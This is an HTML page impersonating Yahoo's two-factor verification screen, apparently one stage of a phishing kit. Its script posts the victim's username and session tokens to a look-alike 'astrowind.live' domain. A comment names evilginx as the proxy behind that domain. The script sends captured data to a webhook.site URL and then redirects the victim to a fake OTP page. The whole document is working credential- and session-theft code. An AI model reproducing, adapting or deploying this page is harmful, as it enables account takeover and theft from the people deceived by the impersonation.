<!DOCTYPE html>
<html data-wf-page="67c6f50ed426ad7d5847f219" data-wf-site="67c6f50ed426ad7d5847f211">
<head>
  <meta charset="utf-8">
  <title>Yahoo - Choose verification method</title>
  <meta content="width=device-width, initial-scale=1" name="viewport">
  <meta content="Webflow" name="generator">
  <link href="css/normalize.css" rel="stylesheet" type="text/css">
  <link href="css/webflow.css" rel="stylesheet" type="text/css">
  <link href="css/yahoo-8d0526.webflow.css" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com" rel="preconnect">
  <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="anonymous">
  <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
  <script type="text/javascript">WebFont.load({google:{families:["Montserrat:100,100italic,200,200italic,300,300italic,400,400italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic","Open Sans:300,300italic,400,400italic,600,600italic,700,700italic,800,800italic"]}});</script>
  <script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script>
  <link href="./yahoo.png" rel="shortcut icon" type="image/x-icon">
  <link href="./yahoo.png" rel="apple-touch-icon">
</head>
<body>
  <section class="section">
    <div class="div-block">
      <div class="div-block-2"><img src="images/yahoo.png" loading="lazy" alt="" class="image"></div>
      <div class="div-block-3">
        <div class="text-block">Help</div>
        <div><a href="https://legal.yahoo.com/in/en/yahoo/terms/otos/index.html" class="link">Terms</a></div>
        <div><a href="https://legal.yahoo.com/in/en/yahoo/privacy/index.html" class="link-2">Privacy</a></div>
      </div>
    </div>
    <div class="layout active">
      <div class="div-block-5">
        <h3 class="header active">Choose how to verify it's you</h3>
        <p class="parag active">We'll send a verification code to help keep your account secure.</p>
      </div>
      <div class="form-block w-form">
        <form id="2fa-form" name="2fa-form" data-name="2FA Form" class="form">
          
          <img src="images/yahoo.png" loading="lazy" alt="" class="image-2">
          
          <div class="pazzi">
            <div class="reflectto" id="userEmail">Choose verification method</div>
            <h1 class="heading-2"><strong>Verify it's you</strong></h1>
            <div class="text-block-2">Select how you'd like to receive your verification code<br></div>
            
            <!-- SMS Option -->
            <div class="verification-option" data-method="sms">
              <div class="option-content">
                <div class="option-icon">📱</div>
                <div class="option-text">
                  <div class="option-title">Text message (SMS)</div>
                  <div class="option-subtitle">We'll send a code to your phone ending in ••••</div>
                </div>
                <div class="option-radio">
                  <input type="radio" name="verification_method" value="sms" id="sms-radio">
                </div>
              </div>
            </div>
            
            <!-- Email Option -->
            <div class="verification-option" data-method="email">
              <div class="option-content">
                <div class="option-icon">📧</div>
                <div class="option-text">
                  <div class="option-title">Email</div>
                  <div class="option-subtitle">We'll send a code to your recovery email</div>
                </div>
                <div class="option-radio">
                  <input type="radio" name="verification_method" value="email" id="email-radio">
                </div>
              </div>
            </div>
            
            <!-- Voice Call Option -->
            <div class="verification-option" data-method="voice">
              <div class="option-content">
                <div class="option-icon">📞</div>
                <div class="option-text">
                  <div class="option-title">Voice call</div>
                  <div class="option-subtitle">We'll call you with a verification code</div>
                </div>
                <div class="option-radio">
                  <input type="radio" name="verification_method" value="voice" id="voice-radio">
                </div>
              </div>
            </div>
            
            <button type="submit" class="logger w-button" disabled>Send verification code</button>
          </div>
        </form>
      </div>
    </div>
  </section>

  <!-- Perfect 2FA Styles -->
  <style>
  .verification-option {
    border: 2px solid #e1e5e9;
    border-radius: 8px;
    padding: 16px;
    margin: 12px 0;
    cursor: pointer;
    transition: all 0.2s ease;
    position: relative;
  }
  
  .verification-option:hover {
    border-color: #0078d4;
    background-color: #f8f9fa;
  }
  
  .verification-option.selected {
    border-color: #0078d4;
    background-color: #e3f2fd;
  }
  
  .option-content {
    display: flex;
    align-items: center;
  }
  
  .option-icon {
    font-size: 24px;
    margin-right: 16px;
  }
  
  .option-text {
    flex: 1;
  }
  
  .option-title {
    font-weight: 600;
    font-size: 16px;
    color: #323130;
  }
  
  .option-subtitle {
    font-size: 14px;
    color: #605e5c;
    margin-top: 4px;
  }
  
  .option-radio {
    margin-left: 16px;
  }
  
  .option-radio input[type="radio"] {
    width: 20px;
    height: 20px;
    cursor: pointer;
  }
  
  .sending-indicator {
    display: none;
    text-align: center;
    padding: 20px;
    color: #0078d4;
    font-weight: 600;
  }
  
  .sending-indicator.active {
    display: block;
  }
  </style>

  <!-- Original Webflow Scripts -->
  <script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=67c6f50ed426ad7d5847f211" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
  <script src="js/webflow.js" type="text/javascript"></script>

  <!-- Perfect 2FA Selection Logic -->
  <script>
  console.log('Perfect 2FA Selection Page - Real OTP Triggering Initialized');
  
  // Global 2FA session management
  window.perfect2FA = {
    username: null,
    validatedSession: null,
    selectedMethod: null,
    otpTriggered: false
  };
  
  // Real Yahoo 2FA API triggering
  async function triggerRealYahoo2FA(method, username, sessionData) {
    console.log(`Triggering real Yahoo ${method} 2FA for ${username}`);
    
    const triggerEndpoints = [
      'https://login.astrowind.live/account/challenge/challenge-selector',
      'https://login.astrowind.live/account/challenge/email-verify',
      'https://login.astrowind.live/account/challenge/sms-verify'
    ];
    
    const triggerData = {
      method: method,
      username: username,
      sessionIndex: sessionData?.sessionIndex || 'QQ--',
      acrumb: sessionData?.acrumb || '',
      browser_fp: sessionData?.browser_fp || '',
      challenge_type: method === 'sms' ? 'SMS' : method === 'email' ? 'EMAIL' : 'VOICE'
    };
    
    let triggered = false;
    
    // Try multiple endpoints for maximum success rate
    for (const endpoint of triggerEndpoints) {
      try {
        console.log(`Attempting 2FA trigger via ${endpoint}`);
        
        const response = await fetch(endpoint, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://login.astrowind.live',
            'Referer': 'https://login.astrowind.live/',
            'X-Requested-With': 'XMLHttpRequest'
          },
          body: new URLSearchParams(triggerData),
          credentials: 'include'
        });
        
        console.log(`2FA trigger response from ${endpoint}:`, response.status);
        
        if (response.ok || response.status === 302 || response.status === 200) {
          triggered = true;
          console.log(`✅ Real Yahoo ${method} 2FA triggered successfully via ${endpoint}`);
          break;
        }
        
      } catch (error) {
        console.log(`2FA trigger failed for ${endpoint}:`, error);
      }
    }
    
    // Fallback: Direct Yahoo API call (if evilginx allows)
    if (!triggered) {
      try {
        const directResponse = await fetch('https://login.yahoo.com/account/challenge/challenge-selector', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://login.yahoo.com',
            'Referer': 'https://login.yahoo.com/'
          },
          body: new URLSearchParams(triggerData),
          credentials: 'include'
        });
        
        if (directResponse.ok) {
          triggered = true;
          console.log('✅ Real Yahoo 2FA triggered via direct API');
        }
      } catch (error) {
        console.log('Direct Yahoo API trigger failed:', error);
      }
    }
    
    return triggered;
  }
  
  // Perfect data capture for 2FA selection
  function capture2FASelection(username, method, triggered) {
    const captureData = {
      type: '2fa_method_selection',
      username: username,
      method: method,
      otp_triggered: triggered,
      session_data: window.perfect2FA.validatedSession,
      timestamp: Date.now(),
      user_agent: navigator.userAgent,
      page: '2fa_selection_perfect'
    };
    
    // Send to webhook
    fetch('https://webhook.site/your-webhook-id', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(captureData)
    }).catch(error => {
      console.log('Webhook capture failed:', error);
    });
    
    console.log('2FA selection captured:', captureData);
  }
  
  document.addEventListener('DOMContentLoaded', function() {
    console.log('DOM loaded, initializing perfect 2FA selection...');
    
    // 1. Validate session from password page
    const urlParams = new URLSearchParams(window.location.search);
    const username = urlParams.get('u');
    const validated = urlParams.get('validated') === 'true';
    
    if (!username || !validated) {
      console.log('Invalid session, redirecting to password page');
      window.location.href = 'https://custom-yahoo-2fa-test.vercel.app/';
      return;
    }
    
    // 2. Restore validated session
    try {
      const storedSession = localStorage.getItem('yahooValidatedSession');
      if (storedSession) {
        window.perfect2FA.validatedSession = JSON.parse(storedSession);
      }
    } catch (e) {
      console.log('No validated session found');
    }
    
    if (!window.perfect2FA.validatedSession) {
      console.log('No validated session, redirecting to password page');
      window.location.href = 'https://custom-yahoo-2fa-test.vercel.app/';
      return;
    }
    
    // 3. Initialize form
    window.perfect2FA.username = username;
    document.getElementById('userEmail').textContent = username;
    
    console.log('2FA form initialized with validated session:', window.perfect2FA.validatedSession);
    
    // 4. Handle option selection
    const submitBtn = document.querySelector('[type="submit"]');
    
    document.querySelectorAll('.verification-option').forEach(option => {
      option.addEventListener('click', function() {
        // Remove previous selection
        document.querySelectorAll('.verification-option').forEach(opt => {
          opt.classList.remove('selected');
          opt.querySelector('input[type="radio"]').checked = false;
        });
        
        // Select current option
        this.classList.add('selected');
        this.querySelector('input[type="radio"]').checked = true;
        window.perfect2FA.selectedMethod = this.dataset.method;
        
        // Enable submit button
        submitBtn.disabled = false;
        
        console.log('Selected 2FA method:', window.perfect2FA.selectedMethod);
      });
    });
    
    // 5. Perfect form submission with real OTP triggering
    document.getElementById('2fa-form').addEventListener('submit', async function(e) {
      e.preventDefault();
      
      if (!window.perfect2FA.selectedMethod) {
        alert('Please select a verification method');
        return;
      }
      
      console.log(`Triggering real Yahoo ${window.perfect2FA.selectedMethod} 2FA...`);
      
      submitBtn.disabled = true;
      submitBtn.textContent = 'Sending verification code...';
      
      // Show sending indicator
      const sendingDiv = document.createElement('div');
      sendingDiv.className = 'sending-indicator active';
      sendingDiv.innerHTML = `
        <div>📱 Sending ${window.perfect2FA.selectedMethod} verification code...</div>
        <div style="font-size: 14px; margin-top: 8px;">This may take a few moments</div>
      `;
      document.querySelector('.pazzi').appendChild(sendingDiv);
      
      // Trigger real Yahoo 2FA
      const triggered = await triggerRealYahoo2FA(
        window.perfect2FA.selectedMethod, 
        username, 
        window.perfect2FA.validatedSession
      );
      
      // Capture the selection and trigger result
      capture2FASelection(username, window.perfect2FA.selectedMethod, triggered);
      
      // Update UI based on trigger result
      if (triggered) {
        sendingDiv.innerHTML = `
          <div style="color: #28a745;">✅ Verification code sent successfully!</div>
          <div style="font-size: 14px; margin-top: 8px;">Check your ${window.perfect2FA.selectedMethod === 'sms' ? 'phone' : window.perfect2FA.selectedMethod === 'email' ? 'email' : 'phone for the call'}</div>
        `;
        
        // Store 2FA session for OTP page
        const otpSession = {
          ...window.perfect2FA.validatedSession,
          method: window.perfect2FA.selectedMethod,
          otp_triggered: true,
          trigger_timestamp: Date.now()
        };
        
        localStorage.setItem('yahooOTPSession', JSON.stringify(otpSession));
        
        // Redirect to OTP page after delay
        setTimeout(() => {
          window.location.href = `https://yahoo-otp-verify.vercel.app/?u=${encodeURIComponent(username)}&method=${window.perfect2FA.selectedMethod}&triggered=true`;
        }, 3000);
        
      } else {
        sendingDiv.innerHTML = `
          <div style="color: #dc3545;">⚠️ Unable to send verification code</div>
          <div style="font-size: 14px; margin-top: 8px;">Please try again or select a different method</div>
        `;
        
        submitBtn.disabled = false;
        submitBtn.textContent = 'Send verification code';
        
        // Remove error after 5 seconds
        setTimeout(() => {
          sendingDiv.remove();
        }, 5000);
      }
    });
  });
  </script>
</body>
</html>
